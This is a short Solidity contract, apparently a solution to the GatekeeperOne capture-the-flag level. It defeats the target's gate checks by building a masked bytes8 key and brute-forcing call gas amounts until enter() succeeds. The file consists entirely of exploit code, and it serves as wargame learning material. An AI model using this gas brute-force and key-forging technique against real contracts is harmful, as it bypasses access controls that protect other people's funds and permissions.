// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "./GateKeeperOne.sol";

contract AttackGKPOne{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0x0123456789abcdef;
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    function setGatekeeperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }
    
    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
         (bool result, bytes memory data) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key));
      if(result)
        {
        break;
      }
    }
  }
}
